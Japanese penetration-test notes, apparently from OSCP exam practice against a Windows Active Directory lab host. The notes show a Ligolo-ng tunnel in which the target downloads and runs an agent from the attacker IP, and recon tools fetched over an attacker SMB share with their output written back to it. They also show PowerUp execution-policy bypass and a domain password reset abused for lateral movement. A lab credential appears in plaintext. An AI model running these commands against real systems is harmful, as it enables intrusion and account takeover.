# Tunnelの整備

- [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)を使用
```sh
# Attacker
sudo ip tuntap add user koshi mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.104.0/24 dev ligolo
ligolo-proxy -selfcert -laddr 0.0.0.0:1337
```

```powershell
# Target
cd ~
iwr -uri http://192.168.49.104:8888/agent.exe -Outfile .\agent.exe
.\agent.exe -connect 192.168.49.104:1337 -ignore-cert

```
![[Pasted image 20260222183730.png]]
# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
```

### 実行結果抽出 -> 特になし

```powershell

```

---
---

## Manual

### ユーザー


---

### システム情報

```powershell
PS C:\Users\Public> systeminfo

Host Name:                 WS26
OS Name:                   Microsoft Windows 11 Enterprise
OS Version:                10.0.22631 N/A Build 22631
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00328-90000-00000-AAOEM
Original Install Date:     10/9/2024, 2:48:16 PM
System Boot Time:          11/11/2024, 10:49:27 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.20192059.B64.2207280708, 7/28/2022
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,655 MB
Virtual Memory: Max Size:  7,807 MB
Virtual Memory: Available: 5,183 MB
Virtual Memory: In Use:    2,624 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    oscp.exam
Logon Server:              \\DC20
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5044033
                           [02]: KB5027397
                           [03]: KB5044285
                           [04]: KB5046247
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.104.206
                           [02]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.104.206
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

---

### ネットワーク


---

### インストール済みアプリケーション

- 特になし
```sh
PS C:\> $paths = @(
>> "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
PS C:\> Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion   InstallLocation
-----------                                                        --------------   ---------------
Microsoft Edge                                                     100.0.1185.36    C:\Program Files (x86)\Microsoft\Edge\Application
Microsoft Edge Update                                              1.3.173.55
Microsoft Edge WebView2 Runtime                                    100.0.1185.36
Microsoft OneDrive                                                 22.012.0117.0003
Microsoft Update Health Tools                                      5.72.0.0
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326        14.32.31326
VMware Tools                                                       12.1.0.20219665  C:\Program Files\VMware\VMware Tools\
```

```powershell
# 64bit版
dir "C:\Program Files"
# 32bit版
dir "C:\Program Files (x86)"
# Downloadフォルダの探索
dir ~\Downloads
```

---

### 実行中のプロセス 

```powershell
# 除外ワードは,"<term>"で追加可能
ps | Where-Object -Property ProcessName -notin "svchost"
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    176      11     3608      11336              3000   0 AggregatorHost
    324      17    14008      35768       6.44   6776   2 conhost
    498      21     1720       5928               512   0 csrss
    161      11     1664       5484               616   1 csrss
    405      17     2104      13676              6148   2 csrss
    628      25     9148      33664       0.59   5504   2 ctfmon
    276      15     3816      14880              3792   0 dllhost
    148       9     1600       8992       0.06   4796   2 dllhost
    251      18     3656      15200       0.08   8556   2 dllhost
    710      27    22272      51436               676   1 dwm
    954      64    40252     104328              6652   2 dwm
   3017      95    63304     186956      15.80   4916   2 explorer
     42       6     1500       4144               884   1 fontdrvhost
     42       6     1532       4108               888   0 fontdrvhost
     42       8     3140       7312              6660   2 fontdrvhost
      0       0       60          8                 0   0 Idle
    759      35    13828      56364              3916   1 LogonUI
   1459      34     6376      25008               748   0 lsass
      0       0       40          0              1952   0 Memory Compression
    219      14     1924        236              5968   0 MicrosoftEdgeUpdate
    259      14     8608      23124              5032   0 MoUsoCoreWorker
    237      14     2856      11056              3924   0 msdtc
    213      14     6848      19152       0.13   1460   2 msedgewebview2
    994      44    23456      86352       1.28   3752   2 msedgewebview2
    268      17     8636      28416       0.13   4172   2 msedgewebview2
    153      10     1948       7944       0.03   5800   2 msedgewebview2
    442      23   102624      37088       0.27   8588   2 msedgewebview2
    291      16    34056      79696       8.06   9004   2 msedgewebview2
    680      34    21268      73152       3.02   1916   2 Notepad
    563      34    12236      52512       0.28   9012   2 OneDrive
    559      29    54212      67860       0.47   4236   2 powershell
    805      37   111128     133732      14.36   9116   2 powershell
    348      13     2608      13008       0.30   6920   2 rdpclip
      0      16     4184      21168                92   0 Registry
    363      20     5692      28584       1.41   7400   2 RuntimeBroker
    687      34    13496      49948       1.58   8164   2 RuntimeBroker
   1424     103   122500     209132       7.64   8052   2 SearchHost
    753      19    17604      31540              5172   0 SearchIndexer
    687      15     5344      13992               716   0 services
    549      26     9172       3528       0.23   8944   2 ShellExperienceHost
    599      18     5756      27660       4.11   4124   2 sihost
     61       3     1072       1228               376   0 smss
    869      41    45472     104456       3.83   8060   2 StartMenuExperienceHost
   3227       0       36        148                 4   0 System
    281      29     5256      17024       0.17   6740   2 taskhostw
   1102      37    25584      73500       1.64   8828   2 TextInputHost
    125       7     1296       6364              1340   0 uhssvc
    142      10     1740       9220       0.03   6636   2 UserOOBEBroker
    178      12     2896      12324              3004   0 VGAuthService
    130       8     1468       6632              2224   0 vm3dservice
    130       9     1580       7056              3256   1 vm3dservice
    234      17     4796      15776       0.13   1292   2 vmtoolsd
    417      25    10824      23868              3020   0 vmtoolsd
    552      25     7028      35016       0.78   3404   2 Widgets
    132      11     1264       7192               608   0 wininit
    224      13     2468      18212               700   1 winlogon
    242      11     2204      10400              6464   2 winlogon
    334      19    11284      24168              4440   0 WmiPrvSE
    371      14     3692      38508              4396   0 WUDFHost


PS C:\Users\Public>

```


---

### サービス -> nothing 

```powershell
PS C:\> # cmd.exeの場合：sc query [service]  sc qc [service]
PS C:\> Get-CimInstance -ClassName Win32_Service |
>>   Where-Object {
>>       $_.State -eq 'Running' -and
>>       $_.StartName -notin @('NT AUTHORITY\LocalService', 'NT AUTHORITY\NetworkService')
>>   } |
>>   Select-Object Name, StartName, PathName

Name                          StartName   PathName
----                          ---------   --------
Appinfo                       LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
AudioEndpointBuilder          LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
BITS                          LocalSystem C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure          LocalSystem C:\Windows\system32\svchost.exe -k DcomLaunch -p
camsvc                        LocalSystem C:\Windows\system32\svchost.exe -k osprivacy -p
CertPropSvc                   LocalSystem C:\Windows\system32\svchost.exe -k netsvcs
COMSysApp                     LocalSystem C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
DcomLaunch                    LocalSystem C:\Windows\system32\svchost.exe -k DcomLaunch -p
DiagTrack                     LocalSystem C:\Windows\System32\svchost.exe -k utcsvc -p
DisplayEnhancementService     LocalSystem C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
DsmSvc                        LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
DsSvc                         LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
gpsvc                         LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
IKEEXT                        LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
InstallService                LocalSystem C:\Windows\System32\svchost.exe -k netsvcs -p
InventorySvc                  LocalSystem C:\Windows\system32\svchost.exe -k InvSvcGroup -p
iphlpsvc                      LocalSystem C:\Windows\System32\svchost.exe -k NetSvcs -p
KeyIso                        LocalSystem C:\Windows\system32\lsass.exe
LanmanServer                  LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
lfsvc                         LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
LSM
NcbService                    LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Netlogon                      LocalSystem C:\Windows\system32\lsass.exe
Netman                        LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
PcaSvc                        LocalSystem C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
PlugPlay                      LocalSystem C:\Windows\system32\svchost.exe -k DcomLaunch -p
Power                         LocalSystem C:\Windows\system32\svchost.exe -k DcomLaunch -p
ProfSvc                       LocalSystem C:\Windows\system32\svchost.exe -k UserProfileService -p
SamSs                         LocalSystem C:\Windows\system32\lsass.exe
ScDeviceEnum                  LocalSystem C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted
Schedule                      LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
SENS                          LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
SessionEnv                    localSystem C:\Windows\System32\svchost.exe -k netsvcs -p
ShellHWDetection              LocalSystem C:\Windows\System32\svchost.exe -k netsvcs -p
StateRepository               LocalSystem C:\Windows\system32\svchost.exe -k appmodel -p
StorSvc                       LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
SysMain                       LocalSystem C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
SystemEventsBroker            LocalSystem C:\Windows\system32\svchost.exe -k DcomLaunch -p
TextInputManagementService    LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Themes                        LocalSystem C:\Windows\System32\svchost.exe -k netsvcs -p
TokenBroker                   LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
TrkWks                        LocalSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
uhssvc                        LocalSystem "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
UmRdpService                  localSystem C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
UserManager                   LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
UsoSvc                        LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
VaultSvc                      LocalSystem C:\Windows\system32\lsass.exe
VGAuthService                 LocalSystem "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
vm3dservice                   LocalSystem C:\Windows\system32\vm3dservice.exe
VMTools                       LocalSystem "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
Winmgmt                       localSystem C:\Windows\system32\svchost.exe -k netsvcs -p
WpnService                    LocalSystem C:\Windows\system32\svchost.exe -k netsvcs -p
WSearch                       LocalSystem C:\Windows\system32\SearchIndexer.exe /Embedding
cbdhsvc_29ccec                            C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
CDPUserSvc_29ccec                         C:\Windows\system32\svchost.exe -k UnistackSvcGroup
NPSMSvc_29ccec                            C:\Windows\system32\svchost.exe -k LocalService -p
OneSyncSvc_29ccec                         C:\Windows\system32\svchost.exe -k UnistackSvcGroup
PimIndexMaintenanceSvc_29ccec             C:\Windows\system32\svchost.exe -k UnistackSvcGroup
UdkUserSvc_29ccec                         C:\Windows\system32\svchost.exe -k UdkSvcGroup
UnistoreSvc_29ccec                        C:\Windows\System32\svchost.exe -k UnistackSvcGroup
UserDataSvc_29ccec                        C:\Windows\system32\svchost.exe -k UnistackSvcGroup
WpnUserService_29ccec                     C:\Windows\system32\svchost.exe -k UnistackSvcGroup
```

- PowerUpでの列挙 -> 特になsい
```powershell
powershell -ep bypass
import-module .\PowerUp.ps1
Get-ModifiableService
Get-ModifiableServiceFile
```


---

### スケジュールタスク -> nothing

- 何もなし
```powershell
PS C:\Users\Public> $header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
PS C:\Users\Public> schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
PS C:\Users\Public> Get-ModifiableScheduledTaskFile
```


---

### 興味深い情報

- 認証情報
```powershell

```

---
---

# Credential harvesting

powershell history->特になし
```powershell
Get-History # 特になし
(Get-PSReadlineOption).HistorySavePath も特になし
```

cmdkey ->なし




---

# AD

- AS-REP roastable、Kerberoastableは両方存在しない

## Domain共有の列挙

```powershell
PS C:\Users\Public> find-domainshare

Name           Type Remark              ComputerName
----           ---- ------              ------------
ADMIN$   2147483648 Remote Admin        DC20.oscp.exam
C$       2147483648 Default share       DC20.oscp.exam
IPC$     2147483651 Remote IPC          DC20.oscp.exam
NETLOGON          0 Logon server share  DC20.oscp.exam
SYSVOL            0 Logon server share  DC20.oscp.exam
ADMIN$   2147483648 Remote Admin        SRV22.oscp.exam
C$       2147483648 Default share       SRV22.oscp.exam
IPC$     2147483651 Remote IPC          SRV22.oscp.exam
ADMIN$   2147483648 Remote Admin        WS26.oscp.exam
C$       2147483648 Default share       WS26.oscp.exam
IPC$     2147483651 Remote IPC          WS26.oscp.exam

# アクセス可能なdomain共有の列挙
PS C:\Users\Public> Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
NETLOGON          0 Logon server share  DC20.oscp.exam
SYSVOL            0 Logon server share  DC20.oscp.exam
ADMIN$   2147483648 Remote Admin        WS26.oscp.exam
C$       2147483648 Default share       WS26.oscp.exam
```

- それぞれのshareにアクセス

### SYSVOL

```powershell
PS C:\Users\Public> ls \\DC20.oscp.exam\sysvol


    Directory: \\DC20.oscp.exam\sysvol


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l         10/9/2024  11:21 AM                oscp.exam


PS C:\Users\Public> ls \\DC20.oscp.exam\sysvol\oscp.exam


    Directory: \\DC20.oscp.exam\sysvol\oscp.exam


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2024  11:31 AM                Policies
d-----         10/9/2024  11:21 AM                scripts


PS C:\Users\Public> ls \\DC20.oscp.exam\sysvol\oscp.exam\Policies


    Directory: \\DC20.oscp.exam\sysvol\oscp.exam\Policies


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2024  11:31 AM                {15DBA1A6-9352-4857-A726-250511B9C528}
d-----         10/9/2024  11:31 AM                {18B8F74A-2AA5-4FB9-A69F-7F362AA9FB96}
d-----         10/9/2024  11:31 AM                {26FD9D29-21AB-425D-9346-69B242077F99}
d-----         10/9/2024  11:21 AM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----         10/9/2024  11:31 AM                {3C32C10F-1BF8-45DB-8A78-7A91E2B82B06}
d-----         10/9/2024  11:31 AM                {6A3D702F-AAC4-474B-89F6-10B7D3C20248}
d-----         10/9/2024  11:21 AM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
d-----         10/9/2024  11:31 AM                {A8CF2A8F-AB92-4167-9E04-62FC66C27EAE}


PS C:\Users\Public> ls \\DC20.oscp.exam\sysvol\oscp.exam\scripts
PS C:\Users\Public>
```

### NETLOGON -> nothing

```powerhsll
PS C:\Users\Public> ls \\DC20.oscp.exam\netlogon
```

### ADMIN$

- 中身一緒なので列挙の意味ないかも
```powershell
PS C:\Users\Public> ls \\WS26.oscp.exam\ADMIN$


    Directory: \\WS26.oscp.exam\ADMIN$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/10/2024   7:39 PM                appcompat
d-----         10/9/2024  12:32 PM                apppatch
d-----         2/21/2026   7:25 PM                AppReadiness
d-r---         10/9/2024  11:15 AM                assembly
d-----         10/9/2024  12:32 PM                bcastdvr
d-----          7/3/2024  11:43 PM                Boot
d-----          5/6/2022  10:24 PM                Branding
d-----          7/3/2024  11:43 PM                BrowserCore
d-----         10/9/2024  12:15 PM                CbsTemp
d-----          5/7/2022  12:41 AM                Containers
d-----         10/9/2024   2:50 PM                CSC
d-----          5/6/2022  10:24 PM                Cursors
d-----         10/9/2024  11:36 AM                debug
d-----          5/6/2022  10:42 PM                diagnostics
d-----          7/3/2024  11:43 PM                DiagTrack
d-----          5/7/2022  12:30 AM                DigitalLocker
d---s-          5/6/2022  10:24 PM                Downloaded Program Files
d-----          7/3/2024  11:43 PM                en-US
d-r-s-         10/9/2024  12:32 PM                Fonts
d-----          7/3/2024  11:43 PM                Globalization
d-----          5/7/2022  12:30 AM                Help
d-----          5/6/2022  10:42 PM                IdentityCRL
d-----         10/9/2024  12:32 PM                IME
d-r---         2/21/2026   7:03 PM                ImmersiveControlPanel
d-----          7/3/2024  11:43 PM                InboxApps
d-----        11/11/2024  10:58 AM                INF
d-----          5/6/2022  10:42 PM                InputMethod
d-----          5/6/2022  10:24 PM                L2Schemas
d-----          5/6/2022  10:24 PM                LiveKernelReports
d-----        10/29/2024  12:55 AM                Logs
d-----          5/6/2022  10:42 PM                Media
d-r---         2/21/2026   7:02 PM                Microsoft.NET
d-----          5/6/2022  10:24 PM                Migration
d-----          5/6/2022  10:24 PM                ModemLogs
d-----          5/7/2022  12:31 AM                OCR
d-r---          5/6/2022  10:24 PM                Offline Web Pages
d-----         10/9/2024  11:15 AM                Panther
d-----          5/6/2022  10:24 PM                Performance
d-----          5/6/2022  10:42 PM                PLA
d-----         10/9/2024  12:32 PM                PolicyDefinitions
d-----         2/21/2026  11:53 PM                Prefetch
d-r---         2/21/2026   7:19 PM                PrintDialog
d-----         10/9/2024  12:32 PM                Provisioning
d-----        11/11/2024  10:49 AM                Registration
d-----          5/7/2022  12:39 AM                RemotePackages
d-----          5/6/2022  10:24 PM                rescache
d-----          5/6/2022  10:42 PM                Resources
d-----          5/6/2022  10:24 PM                SchCache
d-----          5/7/2022  12:39 AM                schemas
d-----         10/9/2024  11:41 AM                security
d-----         10/9/2024   2:44 PM                ServiceProfiles
d-----         2/21/2026   7:03 PM                ServiceState
d-----         10/9/2024  12:32 PM                servicing
d-----          5/6/2022  10:28 PM                Setup
d-----         10/9/2024  12:32 PM                ShellComponents
d-----         10/9/2024  12:32 PM                ShellExperiences
d-----          5/6/2022  10:42 PM                SKB
d-----         10/9/2024   3:19 PM                SoftwareDistribution
d-----          5/6/2022  10:24 PM                Speech
d-----          5/6/2022  10:24 PM                Speech_OneCore
d-----          5/6/2022  10:24 PM                System
d-----        11/11/2024  10:58 AM                System32
d-----         10/9/2024  12:32 PM                SystemApps
d-----         10/9/2024  12:33 PM                SystemResources
d-----         2/21/2026   8:38 PM                SystemTemp
d-----         10/9/2024  12:33 PM                SysWOW64
d-----          5/6/2022  10:24 PM                TAPI
d-----         10/9/2024   2:44 PM                Tasks
d-----         2/21/2026   7:21 PM                Temp
d-----          5/6/2022  10:24 PM                tracing
d-----          5/6/2022  10:25 PM                twain_32
d-----         10/9/2024  12:33 PM                UUS
d-----          5/6/2022  10:24 PM                Vss
d-----          5/6/2022  10:24 PM                WaaS
d-----          5/6/2022  10:42 PM                Web
d-----         2/21/2026   7:23 PM                WinSxS
d-----         10/9/2024  12:33 PM                WUModels
-a----         10/9/2024  12:08 PM         122880 bfsvc.exe
-a--s-        11/11/2024  10:51 AM          67584 bootstat.dat
-a----          5/6/2022  10:21 PM          24895 CloudEdition.xml
-a----         10/9/2024   2:47 PM           2327 DtcInstall.log
-a----          5/6/2022  10:21 PM          24895 Education.xml
-a----          5/6/2022  10:21 PM          24935 Enterprise.xml
-a----         10/9/2024  12:08 PM        5596280 explorer.exe
-a----          7/3/2024  11:37 PM        1089536 HelpPane.exe
-a----          5/6/2022  10:20 PM          36864 hh.exe
-a----          5/6/2022  10:21 PM          24895 IoTEnterprise.xml
-a----         10/9/2024   2:44 PM           1378 lsasetup.log
-a----          5/6/2022  10:19 PM          43131 mib.bin
-a----          7/3/2024  11:38 PM         360448 notepad.exe
-a----         10/9/2024  11:27 AM           1268 PFRO.log
-a----          5/6/2022  10:21 PM          24935 Professional.xml
-a----          5/6/2022  10:21 PM          24895 ProfessionalCountrySpecific.xml
-a----          5/6/2022  10:21 PM          24895 ProfessionalEducation.xml
-a----          5/6/2022  10:21 PM          248
```

### C$

```powershell

```


## G.JARVISへの横展開

- r.andrewsは、G.Jarvisに"AllExtendedRights"をもつため、パスワード変更が可能
	- また、G.JARVISは、WS26にRemote Managerの権限をもつ
![[Pasted image 20260222163423.png]]

- パスワード変更を実行
```powershell
$NewPassword = ConvertTo-SecureString "Password123" -AsPlainText -Force
Set-DomainUserPassword -Identity "CN=g.jarvis,CN=Users,DC=oscp,DC=exam" -AccountPassword $NewPassword
```

- パスワード変更に成功
```powershell
┌──(koshi㉿kali)-[~/Exam/AD/WS26]
└─$ evil-winrm -i 192.168.104.206  -u 'g.jarvis' -p 'Password123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\g.jarvis\Documents> 

```
![[Pasted image 20260222164424.png]]


- グループへの追加はAccess is denied
```powershell
$SecPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('OSCP.EXAM\r.andrews', $SecPassword)

Add-DomainGroupMember -Identity 'CN=Remote Desktop Users,CN=Builtin,DC=oscp,DC=exam' -Members 'CN=g.jarvis,CN=Users,DC=oscp,DC=exam' -Credential $Cred
```


---

# Seatbelt

## 記録用結果（長文注意）

```powershell
a


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : 

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static
    224.0.0.252           00-00-00-00-00-00     Static
    239.255.255.250       00-00-00-00-00-00     Static


  Ethernet0 --- Index 11
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : 192.168.104.206
    Internet Address      Physical Address      Type
    192.168.104.111       00-50-56-8A-67-09     Dynamic
    192.168.104.254       00-50-56-8A-C5-9B     Dynamic
    192.168.104.255       FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


  Ethernet1 --- Index 12
    Interface Description : Intel(R) 82574L Gigabit Network Connection
    Interface IPs      : 172.16.104.206
    DNS Servers        : 172.16.104.200

    Internet Address      Physical Address      Type
    172.16.104.200        00-50-56-8A-16-6F     Dynamic
    172.16.104.255        FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
CurrentUser\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
